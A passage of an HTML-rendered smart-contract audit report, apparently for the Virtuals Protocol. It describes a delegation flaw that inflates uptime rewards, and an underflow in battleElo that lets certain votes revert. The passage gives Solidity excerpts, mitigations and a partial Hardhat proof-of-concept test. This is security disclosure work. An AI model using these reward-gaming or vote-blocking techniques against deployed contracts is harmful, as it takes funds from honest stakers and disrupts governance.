class=\"mtk12\"\u003etotalStaked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estakerReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estakerReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euptime\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalProposals\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalClaimable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estakerReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAs a result, repeated delegation records combined with zeroed balances allow the delegatee to appear historically more active, and to receive inflated uptime-based rewards; even though the stake was not present at the time.\u003c/p\u003e\n\u003ch3 id=\"impact-14\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-14\" aria-label=\"impact 14 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003eReward distribution becomes exploitable by staking and undelegating rapidly after maturity.\u003c/li\u003e\n\u003cli\u003eDelegatees receive excessive rewards due to inflated uptime scores based on \u003ccode\u003egetPastDelegates()\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eGovernance power and monetary reward flows become decoupled from actual stake and participation.\u003c/li\u003e\n\u003cli\u003eFairness of the protocol is compromised; malicious users can game the system at the expense of honest stakers and voters.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-24\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-24\" aria-label=\"recommended mitigation steps 24 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eUpdate the \u003ccode\u003ewithdraw()\u003c/code\u003e function to automatically clear a user’s delegation when their token balance drops to zero. This prevents the retention of voting power or reward eligibility after the staker has exited.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-21-battleelo-is-at-risk-of-underflow-revert-which-may-dos-voting\" style=\"position:relative;\"\u003e\u003ca href=\"#m-21-battleelo-is-at-risk-of-underflow-revert-which-may-dos-voting\" aria-label=\"m 21 battleelo is at risk of underflow revert which may dos voting permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-165\"\u003e[M-21] \u003ccode\u003ebattleElo\u003c/code\u003e is at risk of underflow revert, which may DOS voting\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-774\"\u003eoakcobalt\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-412\"\u003etestnate\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eIn EloCalculator.sol, the \u003ccode\u003ebattleElo()\u003c/code\u003e function calculates a new maturity score based on a series of battle results:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"106\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebattleElo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentRating\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebattles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebattles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eresult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emapBattleResultToGameResult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebattles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enegative\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eElo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eratingChange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eresult\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ek\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_roundUp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enegative\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e -= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e -= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003echange\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentRating\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eeloA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//@audit Potential underflow here\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/EloCalculator.sol#L54\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/EloCalculator.sol#L54\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eWhen calculating results of a series of battle, battleElo will subtract \u003ccode\u003ecurrentRating\u003c/code\u003e by the difference in rate change. \u003ccode\u003ecurrentRating + eloA - 1000\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eUnder current AgentDao implementation in \u003ccode\u003e_castVote\u003c/code\u003e → \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L139\"\u003e\u003ccode\u003e_updateMaturity\u003c/code\u003e\u003c/a\u003e → \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L189\"\u003e\u003ccode\u003e_calcMaturity\u003c/code\u003e\u003c/a\u003e, \u003ccode\u003euint8[] memory battles\u003c/code\u003e can result in a negative change to the \u003ccode\u003ecurrentRating\u003c/code\u003e. This case is allowed in the protocol because we see \u003ccode\u003eServiceNft\u003c/code\u003e handles the case when \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L94-L96\"\u003e\u003ccode\u003e_maturities[proposalId] \u0026#x3C; _maturities[prevServiceId]\u003c/code\u003e\u003c/a\u003e in \u003ccode\u003eupdateImpact\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eWhen a validator casts a vote that results in a negative change in currentRating, this might cause \u003ccode\u003ecurrentRating + eloA - 1000\u003c/code\u003e underflow revert when \u003ccode\u003ecurrentRating\u003c/code\u003e is already low.\u003c/p\u003e\n\u003ch3 id=\"impact-15\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-15\" aria-label=\"impact 15 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eDOS conditions:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eValidators may be unable to submit valid votes with specific battle results.\u003c/li\u003e\n\u003cli\u003eThe governance mechanism may be partially blocked for low-maturity services.\u003c/li\u003e\n\u003cli\u003eThe voting process could be disrupted when trying to express certain opinions.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"recommended-mitigation-steps-25\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-25\" aria-label=\"recommended mitigation steps 25 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eIn \u003ccode\u003ebattleElo\u003c/code\u003e, consider checking and handling \u003ccode\u003ecurrentRating + eloA - 1000\u003c/code\u003e underflow case and return a minimal rating value when the underflow case is triggered.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-15\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-15\" aria-label=\"proof of concept 15 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eTest logics:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eBase proposal: \u003ccode\u003eproposal1\u003c/code\u003e executed.\u003c/li\u003e\n\u003cli\u003eCheck \u003ccode\u003eproposal1\u003c/code\u003e’s maturity.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003evalidatorA\u003c/code\u003e’s voting power is twice as \u003ccode\u003evalidatorB\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eproposal2\u003c/code\u003e is created (intended as an upgrade from \u003ccode\u003eproposal1\u003c/code\u003e).\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003evalidatorA\u003c/code\u003e cast a Vote with [0, 0, 0, 0, 0, 0, 1, 0, 1, 0].\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecastVote\u003c/code\u003e revert due to underflow. \u003ccode\u003ecastVote\u003c/code\u003e with specific results DOSsed.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eAdded unit test \u003ccode\u003eunderflow DOS certain voting\u003c/code\u003e in \u003ccode\u003etest/rewardsV2.js\u003c/code\u003e. Run test with: \u003ccode\u003enpx hardhat test test/rewardsV2.js\u003c/code\u003e:\u003c/p\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"107\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eit.only(\u0026quot;underflow DOS certain voting\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    //setup:\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // 1. base proposal: proposal1 executed\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // 2. check proposal1\u0026#39;s maturity\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // 3. validatorA\u0026#39;s voting power is twice as validatorB.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // 4. proposal2 is created (intended as an upgrade from proposal1)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // 5. validatorA cast a Vote with [0, 0, 0, 0, 0, 0, 1, 0, 1, 0]\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // 6. castVote revert due to underflow. castVote with specific results DOSsed.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const base = await loadFixture(deployWithAgent);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { serviceNft, contributionNft, agentNft, virtualToken } = base;\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      founder,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      contributor1,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      contributor2,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      validator1,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      validator2,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      trader,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Setup LP and voting power\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const agentToken = await ethers.getContractAt(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;AgentToken\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      base.agent.token\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const veToken = await ethers.getContractAt(\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      \u0026quot;AgentVeToken\u0026quot;,\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      base.agent.veToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    );\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const lp = await ethers.getContractAt(\u0026quot;IERC20\u0026quot;, base.agent.lp);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan 